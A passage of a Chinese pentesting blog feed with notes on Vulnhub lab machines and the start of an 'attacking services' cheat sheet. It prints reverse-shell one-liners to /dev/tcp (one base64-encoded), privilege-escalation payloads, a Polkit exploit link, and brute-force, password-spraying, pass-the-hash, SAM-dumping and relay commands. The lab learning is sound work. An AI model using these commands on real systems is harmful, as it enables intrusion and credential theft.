可以用于创建一组字符串的扩展，其中逗号分隔每个字符串。这种写法在很多情况下可以用来生成一系列的值。这里的 echo 和 YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU1Ni4xMDEvMjUwMDEgMD4mMQ== 是一对值，逗号分隔了这两个值。在这个上下文中，它的目的似乎是将一个值（YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU1Ni4xMDEvMjUwMDEgMD4mMQ==）传递给 echo 命令。在子命令中，逗号 , 用于分隔多个子命令，以便按顺序执行它们。</code></pre><ul><li><p>靶机中提权时发现缺少二进制文件reset_root的触发器，需要进行调试查看，创建触发器</p></li><li><p>提权部分看到了两种调试工具：</p><ul><li><p>strings：<code>strings</code> 是一个在 Linux 和类 Unix 操作系统中的命令行工具，它用于从二进制文件中提取可打印的字符串。当您需要检查一个二进制文件（如可执行文件、库文件等）中是否包含文本信息，或者需要分析文件中的字符串时，可以使用 <code>strings</code> 命令。</p><p>以下是一些常用的 <code>strings</code> 命令选项：</p><ul><li><code>-n length</code>：指定最小字符串长度。默认情况下，<code>strings</code> 提取长度至少为 4 个字符的字符串。</li><li><code>-a</code>：显示所有的字符串，而不仅仅是可打印字符的字符串。</li><li><code>-o</code>：将结果以字符串的偏移量（在文件中的位置）形式输出。</li><li><code>-t format</code>：指定输出的字符串格式，可以是 d (十进制)、o (八进制)、x (十六进制)。</li><li><code>-e encoding</code>：指定输入文件的字符编码。</li><li><code>-h</code>：显示命令的帮助信息。</li></ul></li><li><p>strace： <code>strace</code> 是一个在 Linux 和类 Unix 操作系统中的命令行工具，用于跟踪和记录应用程序执行期间的系统调用和信号。通过使用 <code>strace</code>，您可以查看一个程序与操作系统之间的交互，以及它执行过程中发生的系统调用、信号和其他相关信息。这对于诊断问题、分析性能瓶颈以及理解程序的行为非常有用。</p><p>以下是一些常用的 <code>strace</code> 命令选项：</p><ul><li><code>-o file</code>：将跟踪信息输出到指定文件中，而不是输出到终端。</li><li><code>-e trace</code>：指定要跟踪的系统调用。例如，<code>-e open,read</code> 只会跟踪 <code>open</code> 和 <code>read</code> 系统调用。</li><li><code>-p pid</code>：跟踪一个已经运行的进程，而不是启动一个新的命令。</li><li><code>-f</code>：同时跟踪子进程。对于多进程应用程序，这可以捕获整个进程树的系统调用。</li><li><code>-s size</code>：限制输出的字符串长度，避免输出过长。</li><li><code>-c</code>：统计系统调用和出错情况的统计信息。</li><li><code>-h</code>：显示命令的帮助信息。</li></ul></li></ul></li></ul><blockquote><p>strace -o output.txt ls -l</p><p>这个命令将会跟踪 <code>ls -l</code> 命令的执行过程，并将跟踪信息输出到名为 <code>output.txt</code> 的文件中。</p></blockquote><h1 id="JANGOW"><a href="#JANGOW" class="headerlink" title="JANGOW"></a>JANGOW</h1><ul><li>有时候防火墙禁用nc -e 操作需要我们使用管道文件或者上传nc文件反弹shell，然后可以通过pty等一句话提权为交互式shell</li><li>其实一般的服务器做端口限制都不会限制80和443，可以把433作为反弹的端口，也可以用脚本简单探测一下：</li><li><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308131125722.png" alt="image"></li></ul><pre><code>for i in &#123;1..65535&#125;;do timeout 1 nc -vz 192.168.11.128 $i &amp;&amp; echo &quot;$i open&quot;&gt;&gt; out.txt || echo &quot;si closed&quot; &gt;&gt; out.txt;done</code></pre><p>脚本的工作原理如下：</p><ol><li>使用 <code>for</code> 循环迭代端口范围从 1 到 65535。</li><li>对每个端口，使用 <code>timeout</code> 命令在 1 秒内尝试使用 <code>nc</code> 命令连接到指定的 IP 地址和端口。</li><li>如果连接成功，将输出 “$i open” 到 <code>out.txt</code> 文件。</li><li>如果连接失败（超时或连接被拒绝），将输出 “si closed” 到 <code>out.txt</code> 文件。</li><li><code>nc -vz</code> 是 <code>nc</code>（netcat）命令的一种使用方式，用于进行基本的网络连接测试和端口扫描。下面是对 <code>-vz</code> 参数的解释：<ul><li><code>-v</code>: 这个选项表示 “verbose”，即详细输出模式。当您使用 <code>-v</code> 参数时，<code>nc</code> 命令会显示更多关于连接和操作的详细信息，包括成功连接时的信息。</li><li><code>-z</code>: 这个选项表示 “zero-I&#x2F;O mode”，即零 I&#x2F;O 模式。在此模式下，<code>nc</code> 命令只会尝试建立连接，而不会进行实际的数据传输。这在执行端口扫描时很有用，因为它不会向目标发送任何实际的数据。</li></ul></li></ol><p>这里在博客<a href="https://www.cnblogs.com/sainet/p/15642784.html">Vulnhub 靶场 JANGOW: 1.0.1 - sainet - 博客园 (cnblogs.com)</a>中还提到一个端口绑定：</p><pre><code>sudo iptables -A PREROUTING -t nat -p tcp --dport 1:65535 -j REDIRECT --to-port 1234</code></pre><blockquote><ul><li><code>iptables</code>: Linux 上的防火墙管理工具。</li><li><code>-A PREROUTING</code>: 添加规则到 PREROUTING 链，这是网络数据包进入路由处理之前的链。</li><li><code>-t nat</code>: 指定操作的表类型为 “nat”，用于网络地址转换。</li><li><code>-p tcp</code>: 指定匹配 TCP 协议的数据包。</li><li><code>--dport 1:65535</code>: 匹配目标端口范围从 1 到 65535。</li><li><code>-j REDIRECT --to-port 1234</code>: 如果匹配，将数据包重定向到本地的 1234 端口。</li></ul></blockquote><h1 id="red"><a href="#red" class="headerlink" title="red"></a>red</h1><p>这是目前位置做到最好的靶机</p><p><a href="https://www.cnblogs.com/upfine/p/16783668.html">upfine的博客 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/dgs1mple/p/16035221.html#">你终于回来了(。・∀・)ノ (cnblogs.com)</a></p><ul><li><p>在web部分扫描到后文文件后打开是空白，此时需要再爆破一个参数进行传值</p></li><li><p>使用hashcat对密码行规则转换</p></li><li><p>提权部分切换用户打开shell：</p><p>sudo -u ippsec &#x2F;usr&#x2F;bin&#x2F;time &#x2F;bin&#x2F;bash</p></li><li><p>在拿到shell后，</p><ul><li>一个是查找用户有权限的文件</li></ul><p>find &#x2F; -group ippsec -type d 2&gt;&#x2F;dev&#x2F;null | grep -v proc.</p><p>（他这里其实是查找的的目录-type d 而不是文件 -type f）</p><ul><li>另一个博主是上传<a href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s">pspy64s</a>监听系统运行的程序，然后发现了后门文件</li></ul></li></ul><p>在日志里发现执行后门代码的记录，命令：vi &#x2F;var&#x2F;log&#x2F;syslog，也查看了定时任务：vim &#x2F;etc&#x2F;crontab</p><p>使用命令：crontab -l可以查看执行后门文件的定时任务</p><h1 id="napping-1-0-1-ova"><a href="#napping-1-0-1-ova" class="headerlink" title="napping-1.0.1.ova."></a>napping-1.0.1.ova.</h1><p><a href="https://www.cnblogs.com/sainet/p/15650122.html">Vulnhub 靶场 NAPPING: 1.0.1 - sainet - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/csacs/article/details/104535225">Reverse Tabnabbing钓鱼_SoulCat.的博客-CSDN博客</a></p><p>这个靶机涉及到网络钓鱼，原理和刚学到的XSS差不多，但是Tab好像不需要设置钓鱼表单，在满足漏洞的情况下好像只需要监听端口就能接收到用户表单，这应该涉及到表单的提交和保存方式</p><p>提权部分修改py文件时使用的shell是 &#x2F;usr&#x2F;bin&#x2F;bash 而不是 &#x2F;bin&#x2F;shell执行脚本（在py文件中）,询问GPT一般用户也是可以使用&#x2F;bin&#x2F;bash的，但是这里可能是设置了权限，以后插入py文件应该要先测试相关情况。</p><p>vim提权时使用<code>！</code>可以执行外部shell命令，以此提权</p><h1 id="EMPIRE-BREAKOUT"><a href="#EMPIRE-BREAKOUT" class="headerlink" title="EMPIRE: BREAKOUT"></a>EMPIRE: BREAKOUT</h1><p><a href="https://www.cnblogs.com/sainet/p/15682132.html#3-10000-%E7%AB%AF%E5%8F%A3">Vulnhub 靶场 EMPIRE: BREAKOUT - sainet - 博客园 (cnblogs.com)</a></p><p>在web部分需要使用enum4linux工具检测服务器上的smb用户结合找到的密码登录后台，smbmap更适合当作客户端登录</p><p>提权部分需要寻找一些可用文件，一般来说对于网站可以寻找一些配置文件<code>*.conf</code> <code>*.config</code>等文件，对于本地提权则可以寻找一些隐藏文件、有权限的文件、密码文件等</p><p>这里白给了一个tar命令，使用getcap查看发现read&#x3D;ep，可以通过加解压对一些文件越权访问，命令：</p><p><code>./tar -cvf pass.tar /var/backups/.old_pass.bak</code></p><ul><li><code>-c</code>: 表示创建一个新的归档文件。</li><li><code>-v</code>: 表示在执行过程中显示详细的处理信息。</li><li><code>-f</code>: 后面紧跟着要创建的归档文件的名称。</li></ul><p><code>./tar -xvf pass.tar </code></p><ul><li><code>-x</code>: 表示从归档文件中提取（解压缩）文件。</li><li><code>-v</code>: 表示在执行过程中显示详细的处理信息。</li><li><code>-f</code>: 后面紧跟着要提取的归档文件的名称。</li></ul><h1 id="Vulnhub-Empire-LupinOne"><a href="#Vulnhub-Empire-LupinOne" class="headerlink" title="Vulnhub-Empire: LupinOne"></a>Vulnhub-Empire: LupinOne</h1><p><a href="https://www.cnblogs.com/C0ngvv/p/15607026.html">Vulnhub-Empire: LupinOne题解 - C0ngvv - 博客园 (cnblogs.com)</a></p><p>这里挺有意思的，在爬虫文件中找到了一个：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308191102804.png" alt="img"></p><p>在而后的扫描中使用<code>~FUZZ</code>查找文件，这实际算得上一个提示hh。</p><p>在ssh密钥登录时，使用ssh -i 指定ssh_key</p><p>这里遇到一个Enter passphrase for key</p><blockquote><p>GPT:<br>在 SSH 连接时，”passphrase” 是指用于保护 SSH 私钥的密码。私钥是 SSH 密钥对中的一部分，用于对连接进行身份验证和加密通信。私钥需要受到保护，以防止未经授权的访问。</p><p>通常情况下，SSH 密钥对由两部分组成：公钥和私钥。公钥存储在远程服务器上，而私钥存储在本地机器上。当您尝试进行 SSH 连接时，您的私钥将用于身份验证。</p><p>如果您的私钥设置了 passphrase（也称为密码短语），则在每次使用私钥进行身份验证时，您都需要输入这个 passphrase。这增加了私钥的安全性，因为即使其他人获得了您的私钥文件，他们也无法在没有知道 passphrase 的情况下使用它。</p></blockquote><p>在提权时给的特权命令制定了非root用户，只能横向移动：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308191103261.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308191103373.png" alt="img"></p><p>最后提权部分用到pip，文件给的提权代码：</p><pre><code>TF=$(mktemp -d)echo &quot;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&quot; &gt; $TF/setup.pypip install $TF</code></pre><p>核心部分还有点疑惑，留个引子</p><h1 id="thale"><a href="#thale" class="headerlink" title="thale"></a>thale</h1><p><a href="https://www.cnblogs.com/sainet/p/15655638.html">Vulnhub 靶场 THALES: 1 - sainet - 博客园 (cnblogs.com)</a></p><p>这个靶机只能说中规中矩吧，web部分用到了msf 和msfveno，感觉很少用到msfveno但确实挺好用的</p><p>提权部分几个博客园的博主讲得都不算很好，尤其是用backup.sh反弹root shell 时为什么等一会就能连接上，我查看了crontab和ps aux ，没有root是看不到定时任务，只有在ps进程中看到了备份脚本在被root执行：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181112204.png" alt="image-20230818111232141"></p><p>root:</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181113859.png" alt="image-20230818111307806"></p><p>这里看到脚本5min执行一次</p><p>我们根据脚本指引来到保存备份文件的地方，发现上一次备份在5分钟前：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181116917.png" alt="image-20230818111611873"></p><p>（其实这里是写文章的时候刚好过了五分钟被截到），一般而言是可以看到上一次备份在几分钟前从而确证它可以自动执行备份。</p><p>最后有提个挺有意思的是，横向移动的时候发现su提示需要一个终端，而使用pty提权后就可以移动了</p><p>大概查了一下：</p><p><a href="https://www.cnblogs.com/sainet/p/15783539.html">Linux 反向 shell 升级为完全可用的 TTY shell - sainet - 博客园 (cnblogs.com)</a></p><p>推测nc得到的shell比较受限，查询了一下TTY：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181124899.png" alt="image-20230818112416855"></p><p>这里看到一直用的一句话提权实际上是伪终端（那就是说伪终端也算终端咯？）</p><h1 id="ICA1"><a href="#ICA1" class="headerlink" title="ICA1"></a>ICA1</h1><p><a href="https://blog.csdn.net/ROSEBUD7_K/article/details/126163403">vulnhub-ica1-通关流程 &#x2F;&#x2F; Kali &amp; 靶场 &amp; 渗透 &amp; Linux_KHDXS7的博客-CSDN博客</a></p><p>挺有意思的一个靶机，先后用了不同的php脚本才反弹了一个可用的shell虽然还是很难用。。</p><p>在web部分dirb先扫到了一个upload目录，在里面有一个users和attachment目录，估计有文件上传漏洞，然后在配置文件中找到了mysql账户密码，登录之后在数据库中分别找到了管理员的邮箱和phpass加密的密码，以及一些用户名表和base64加密的密码表。</p><blockquote><p><code>phpass</code> 以密码哈希算法的方式实现了这一点，同时还提供了一些附加的安全性功能，如防止彩虹表攻击、重放攻击等。</p><p>主要功能和设计原则包括：</p><ol><li><strong>强密码哈希</strong>：<code>phpass</code> 使用哈希算法对密码进行多轮迭代，从而增加破解难度。</li><li><strong>盐值（Salt）</strong>：<code>phpass</code> 使用随机生成的盐值来增加密码哈希的随机性，以及对相同密码的不同哈希值。这有助于防止彩虹表攻击。</li><li><strong>迭代计算</strong>：<code>phpass</code> 通过多次迭代哈希算法，增加破解密码的成本，从而提高密码的安全性。</li><li><strong>密码更新</strong>：<code>phpass</code> 支持密码更新，同时保留旧密码的哈希值，以便在用户登录时验证旧密码。</li><li><strong>防护</strong>：<code>phpass</code> 试图防止不同类型的攻击，如嗅探攻击、重放攻击等。</li><li><code>$P$</code> 是 <code>phpass</code> 中的一个标识符</li></ol></blockquote><p>此时有了两种进攻方式，一个是破解管理员的账户密码，从网页登录管理员后台寻找漏洞，一个是用hydra使用这两个表进行ssh爆破，实际两种都是可行的。</p><p>这里破解管理员密码实际上是使用<code> mkpasswd</code> 创建一个密码替换了原来的密码，正好是Mysql管理员可以执行这个操作，也算是提供了一个思路，那么其实另外一个用户密码表应该也能这么做。</p><p>在管理员后台一个是可以创建用户上传头像，另一个是可以创建工程添加附件，这正好对应了之前upload里猜测的有文件上传漏洞。</p><p>提权部分使用string检查特权文件，发现它在suid下执行cat，使用命令劫持提权成功</p><h1 id="noob："><a href="#noob：" class="headerlink" title="noob："></a>noob：</h1><p><a href="https://www.cnblogs.com/sainet/p/15667985.html">Vulnhub 靶场 NOOB: 1 - sainet - 博客园 (cnblogs.com)</a></p><p>这个靶机挺无语的，web部分拿到了一个信息隐写的压缩文件，然后使用<code>steghide</code>进行拆解:</p><p><code>info &lt;filename&gt;</code>:显示文件信息</p><p><code>extract -sf &lt;filename&gt;</code>:拆解文件（需要密码短语，可能为空）</p><p>后面的提权就是找找找，很难想象有一台明文保存其他用户账号密码的用户配置……找了很多东西发现不如遍历本地用户目录</p><p>最后的nano提权文件给出的wp：</p><pre><code>reset; sh 1&gt;&amp;0 2&gt;&amp;0</code></pre><blockquote><ul><li><code>reset</code>: 这是一个命令，通常用于重置终端显示，清除屏幕上的内容，使终端重新初始化。</li><li><code>sh</code>: 这是一个启动 Shell（命令行解释器）的命令。在这里，它被用于启动一个新的 Shell 进程。</li><li><code>1&gt;&amp;0</code> 和 <code>2&gt;&amp;0</code>：这些是重定向操作符。<code>1&gt;&amp;0</code> 表示将标准输出（文件描述符 1）重定向到标准输入（文件描述符 0），<code>2&gt;&amp;0</code> 表示将标准错误（文件描述符 2）重定向到标准输入（文件描述符 0）。</li></ul></blockquote><p>没有很理解，可能是重启一个终端sh然后把所有信息都重定向到当前nano的输入以便于显示？因为不执行reset整个shell就死机了，不重定向看不到回显</p><h1 id="DRIPPING-BLUES-1"><a href="#DRIPPING-BLUES-1" class="headerlink" title="DRIPPING BLUES: 1"></a>DRIPPING BLUES: 1</h1><p><a href="https://www.freebuf.com/articles/web/327947.html">【Vulnhub 靶场】DRIPPING BLUES: 1 - FreeBuf网络安全行业门户</a></p><p>这个靶机需要破解加密的zip文件：</p><p><code>fcrackzip </code></p><pre><code>fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u respectmydrip.zip</code></pre><p>这里提到ftp穷举爆破可以使用MSF：ftp_login模块</p><p>在robots中发现一个&#x2F;etc。。。推断有文件包含漏洞。</p><p>第二次遇到使用Polkit提权：</p><blockquote><p>基本目前除了最新版的Polkit修复了该漏洞，其他版本都可以提权，可利用版本的范围极大。（<a href="https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py%EF%BC%89">https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py）</a></p></blockquote><p>这里该博主拿到shell后的环境检测也挺细致的</p><h1 id="doubletrouble"><a href="#doubletrouble" class="headerlink" title="doubletrouble"></a>doubletrouble</h1><p><a href="https://www.cnblogs.com/sainet/p/15673203.html">Vulnhub 靶场 DOUBLETROUBLE: 1 - sainet - 博客园 (cnblogs.com)</a></p><p>这里再次用到了图片隐写：stegseek</p><p>爆破：stegseek -crack *.png rockyou.txt -xf output</p><p>上一次拆解隐藏信息的文件使用的是steghide,查询了一下大致seek用于检测，hide大多是用于隐写，当然提取也可以。</p><p>在第二次提权部分我确实不知道怎么快速辨别这个靶机存在dirtucow漏洞，可能遇到比较老的版本都可以拿去对比一下吧</p><h1 id="darkhole2"><a href="#darkhole2" class="headerlink" title="darkhole2 *"></a>darkhole2 *</h1><p><a href="https://blog.csdn.net/weixin_44862511/article/details/132259658">VulnHub-DarkHole_2靶机实战(超详细保姆级教程)_徐长卿学网安的博客-CSDN博客</a></p><p>这个靶机在网页上布置了.git，通过工具<a href="https://github.com/lijiejie/GitHack">githack</a>、<a href="https://github.com/arthaud/git-dumper">git-dumper</a>下载整个仓库分析</p><p>git log</p><p>git diff XXXX</p><p>提权部分涉及到ssh -l的一个映射，搞了半天终于明白了：</p><blockquote><p>ssh <a href="mailto:&#106;&#x65;&#x68;&#x61;&#x64;&#x40;&#49;&#57;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#x39;&#x31;&#46;&#x31;&#x34;&#50;">&#106;&#x65;&#x68;&#x61;&#x64;&#x40;&#49;&#57;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#x39;&#x31;&#46;&#x31;&#x34;&#50;</a> -L </p><p>9999:192.168.91.144:9999</p><p>这将在本地计算机上创建一个 SSH 隧道，将本地计算机上的 9999 端口的数据转发到远程主机 <code>192.168.91.142</code>，然后由远程主机将数据再次转发到远程主机 <code>192.168.91.144</code> 的 9999 端口。</p><p>其中</p><p>-L [bind_address:]port:forward-host:forward-port</p><ul><li><code>bind_address</code>：这是一个可选部分，表示绑定的本地地址。通常可以省略，使得 SSH 监听所有可用的网络接口。</li><li><code>port</code>：这是本地计算机上监听的端口。</li><li><code>forward-host</code>：这是远程主机的地址。</li><li><code>forward-port</code>：这是远程主机上的端口。</li></ul></blockquote><p>实际上是把本地某端口的数据交由ssh连接的主机再转发，相当于代理的感觉</p><p>在反弹shell的时候发现bash -i不能反弹，具体原因不是很清楚，但是嵌套**<code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.91.140/9001 0&gt;&amp;1&#39;</code>**成功反弹，查询后发现：</p><blockquote><p>嵌套 shell 的原因有以下几点：</p><ol><li><strong>维持稳定性</strong>：嵌套 shell 可以在连接中保持稳定，即使连接的初始 shell 会话（例如通过 <code>nc</code> 或 <code>bash</code> 创建的连接）被关闭或中断，嵌套 shell 可以继续运行，确保攻击者能够继续执行操作。</li><li><strong>隐藏连接</strong>：嵌套 shell 可以隐藏连接细节，使连接更加隐蔽。通过将初始连接与嵌套 shell 连接分开，可以减少检测和防御系统发现连接的风险。</li><li><strong>适应性</strong>：嵌套 shell 可以在不同的环境和情况下更灵活地使用。例如，通过在嵌套 shell 中执行各种命令，攻击者可以根据需要进行操作。</li><li><strong>错误处理</strong>：嵌套 shell 可以处理连接中的错误情况，确保连接中断或其他问题不会导致整个攻击操作失败。</li></ol></blockquote><p>如果单层的反弹不行，可以试一下嵌套</p><p>另外发现：crontab只能查看当前用户的定时任务，直接读取&#x2F;etc&#x2F;crontab可以查看本机上的定时任务</p><p>ss命令：</p><p><code>ss</code>（Socket Statistics）命令是一个用于显示关于网络套接字（socket）信息的实用工具，通常用于查看网络连接、监听端口、套接字状态等。<code>ss</code> 命令取代了早期的 <code>netstat</code> 命令，并提供更快速和更详细的网络信息。</p><p><code>ss</code>（Socket Statistics）命令是一个用于显示关于网络套接字（socket）信息的实用工具，通常用于查看网络连接、监听端口、套接字状态等。<code>ss</code> 命令取代了早期的 <code>netstat</code> 命令，并提供更快速和更详细的网络信息。</p><p>以下是一些常用的 <code>ss</code> 命令选项和用法示例：</p><ol><li><p><strong>显示所有网络连接</strong>：</p><pre><code class="bash">ss -tuln</code></pre><p>这会显示所有 TCP（-t）和 UDP（-u）连接的监听端口（-l）信息，以数字格式显示（-n）。</p></li><li><p><strong>显示指定端口的监听情况</strong>：</p><pre><code class="bash">ss -tuln | grep 80</code></pre><p>这会过滤并显示所有监听端口为 80 的连接。</p></li><li><p><strong>显示套接字统计信息</strong>：</p><pre><code class="bash">ss -s</code></pre><p>这会显示套接字统计信息，包括打开的套接字数量、连接状态等。</p></li><li><p><strong>显示 TCP 套接字信息</strong>：</p><pre><code class="bash">ss -t</code></pre><p>这会显示所有 TCP 套接字的详细信息。</p></li><li><p><strong>显示 UDP 套接字信息</strong>：</p><pre><code class="bash">ss -u</code></pre><p>这会显示所有 UDP 套接字的详细信息。</p></li><li><p><strong>显示 Unix 套接字信息</strong>：</p><pre><code class="bash">ss -x</code></pre><p>这会显示所有 Unix 套接字（本地套接字）的详细信息。</p></li><li><p><strong>显示特定用户的套接字信息</strong>：</p><pre><code class="bash">ss -tuln | grep username</code></pre><p>这会过滤并显示与特定用户名相关的连接信息。</p></li><li><p><strong>显示所有套接字信息（包括监听和连接）</strong>：</p><pre><code class="bash">ss -a</code></pre><p>这会显示所有套接字的信息，包括监听和连接状态。</p></li></ol><p>一般可以先-s查看统计信息然后再具体查看相关类型套接字</p><h1 id="BEELZEBUB-1"><a href="#BEELZEBUB-1" class="headerlink" title="BEELZEBUB: 1"></a>BEELZEBUB: 1</h1><p><a href="https://www.cnblogs.com/upfine/p/16888142.html">upfine的博客 (cnblogs.com)</a></p><p>感觉主要是枚举，但有一些扫到的可能有用的目录啥的确实没用上，这里有一个专门针对wp的wpscan，使用-e可以进行枚举，-force忽略检测网站是否是wordpress</p><p>这里提权又遇到policykit，发现在exdb上查询相关名称可以检索到</p><h1 id="hackable-III"><a href="#hackable-III" class="headerlink" title="hackable III"></a>hackable III</h1><p><a href="https://blog.csdn.net/weixin_39368364/article/details/119917637">VulnHub靶机_HACKABLE: III_Yiru Zhao的博客-CSDN博客</a></p><p>图片隐写、端口碰撞、lxd提权</p><p>这里端口碰撞但是没办法启动端口。。。</p><h1 id="hackkid"><a href="#hackkid" class="headerlink" title="hackkid *"></a>hackkid *</h1><p><a href="https://www.freebuf.com/articles/web/324396.html">vulnhub-Hacker_Kid靶机渗透过程 - FreeBuf网络安全行业门户</a></p><p>这个靶机遇到了几个不熟悉的漏洞，比如SSTI注入、DNS区域传输漏洞、Capabilities提权等</p><p>关于DNS区域传输：</p><p>dig  axfr @192.168.26.139  blackhat.local</p><p>这里另一个博主没有使用axfr也能挖到，但是得到的内容比较少</p><p>然后关于SSTI注入：</p><p>该注入也能进行XSS，：这里给出了一个模板注入通用的测试payload：NaN${1+abcdef}<?1+abcdef?>[1+abcdef]</p><p><a href="https://cloud.tencent.com/developer/article/2130787">一文了解SSTI和所有常见payload 以flask模板为例-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><blockquote><p>发现<code>&#123;&#123; --- &#125;&#125;</code>其中的语句被执行了</p><ul><li>这是因为在flask中，渲染引擎Jinja2会将<code>&#123;&#123; --- &#125;&#125;</code>视为变量标识符，会将其包含的内容作为变量处理，从而包裹的语句被执行</li><li>那么，在上一段代码中，如果我们传入的参数内容为<code>&#123;&#123; --- &#125;&#125;</code>包裹的代码，这些代码就会被执行</li></ul></blockquote><p>cap部分：这条命令可以用于发现具有Capabilities特殊操作权限的程序。</p><pre><code>getcap -r / 2&gt;/dev/null      # -r 递归查询</code></pre><p>因为需要找root进程进行注入，所以简单写个shell脚本对root进程进行批量尝试。</p><pre><code>for i in `ps -ef|grep root|grep -v &quot;grep&quot;|awk &#39;&#123;print $2&#125;&#39;`; do python2.7 inject.py $i; done</code></pre><p>通过ss -pantu 找到tcp监听的bind shell，kali使用nc连接</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;记录一些在打靶学习的时候遇到的一些有意思的idea或者方法等&lt;/p&gt;</summary>
    
    
    
    
    <category term="vulnhub" scheme="https://taninluv.github.io/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>attacking SERVICES</title>
    <link href="https://taninluv.github.io/2023/08/10/SERVICES/"/>
    <id>https://taninluv.github.io/2023/08/10/SERVICES/</id>
    <published>2023-08-10T01:57:02.000Z</published>
    <updated>2023-08-20T11:01:36.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Attacking-FTP"><a href="#Attacking-FTP" class="headerlink" title="Attacking FTP"></a>Attacking FTP</h1><h4 id="Brute-Forcing"><a href="#Brute-Forcing" class="headerlink" title="Brute Forcing"></a>Brute Forcing</h4><p> <a href="https://github.com/jmk-foofus/medusa">Medusa</a></p><p>使用Medusa，我们可以使用选项-u指定要针对的单个用户，也可以使用选项-u提供一个包含用户名列表的文件。选项-P用于包含密码列表的文件。我们可以使用选项-M和目标协议（FTP），并使用选项-h作为目标主机名或IP地址。</p><span id="more"></span><pre><code class="shell-session">Tanin@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp </code></pre><h1 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h1><h2 id="攻击-FTP"><a href="#攻击-FTP" class="headerlink" title="攻击 FTP"></a>攻击 FTP</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>ftp 192.168.2.142</code></td><td>使用客户端连接到 FTP 服务器。<code>ftp</code></td></tr><tr><td><code>nc -v 192.168.2.142 21</code></td><td>使用 连接到 FTP 服务器。<code>netcat</code></td></tr><tr><td><code>hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142</code></td><td>暴力破解 FTP 服务。</td></tr></tbody></table><hr><h2 id="攻击中小企业"><a href="#攻击中小企业" class="headerlink" title="攻击中小企业"></a>攻击中小企业</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>smbclient -N -L //10.129.14.128</code></td><td>针对 SMB 服务的空会话测试。</td></tr><tr><td><code>smbmap -H 10.129.14.128</code></td><td>使用 进行网络共享枚举。<code>smbmap</code></td></tr><tr><td><code>smbmap -H 10.129.14.128 -r notes</code></td><td>使用 .<code>smbmap</code></td></tr><tr><td><code>smbmap -H 10.129.14.128 --download &quot;notes\note.txt&quot;</code></td><td>从共享文件夹下载特定文件。</td></tr><tr><td><code>smbmap -H 10.129.14.128 --upload test.txt &quot;notes\test.txt&quot;</code></td><td>将特定文件上传到共享文件夹。</td></tr><tr><td><code>rpcclient -U&#39;%&#39; 10.10.110.17</code></td><td>空会话与 .<code>rpcclient</code></td></tr><tr><td><code>./enum4linux-ng.py 10.10.11.45 -A -C</code></td><td>使用 自动枚举 SMB 服务。<code>enum4linux-ng</code></td></tr><tr><td><code>crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p &#39;Company01!&#39;</code></td><td>针对列表中的不同用户喷洒密码。</td></tr><tr><td><code>impacket-psexec administrator:&#39;Password123!&#39;@10.10.110.17</code></td><td>使用 连接到 SMB 服务。<code>impacket-psexec</code></td></tr><tr><td><code>crackmapexec smb 10.10.110.17 -u Administrator -p &#39;Password123!&#39; -x &#39;whoami&#39; --exec-method smbexec</code></td><td>使用 对 SMB 服务执行命令。<code>crackmapexec</code></td></tr><tr><td><code>crackmapexec smb 10.10.110.0/24 -u administrator -p &#39;Password123!&#39; --loggedon-users</code></td><td>枚举登录用户。</td></tr><tr><td><code>crackmapexec smb 10.10.110.17 -u administrator -p &#39;Password123!&#39; --sam</code></td><td>从 SAM 数据库中提取哈希。</td></tr><tr><td><code>crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</code></td><td>使用哈希传递技术在目标主机上进行身份验证。</td></tr><tr><td><code>impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146</code></td><td>使用 转储 SAM 数据库。<code>impacket-ntlmrelayx</code></td></tr><tr><td><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c &#39;powershell -e &lt;base64 reverse shell&gt;</code></td><td>使用 执行基于 PowerShell 的反向外壳。<code>impacket-ntlmrelayx</code></td></tr></tbody></table><hr><h2 id="攻击-SQL-数据库"><a href="#攻击-SQL-数据库" class="headerlink" title="攻击 SQL 数据库"></a>攻击 SQL 数据库</h2><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>mysql -u julio -pPassword123 -h 10.129.20.13</code></td><td>连接到 MySQL 服务器。</td></tr><tr><td><code>sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P &#39;MyPassword!&#39; -y 30 -Y 30</code></td><td>连接到 MSSQL 服务器。</td></tr><tr><td><code>sqsh -S 10.129.203.7 -U julio -P &#39;MyPassword!&#39; -h</code></td><td>从 Linux 连接到 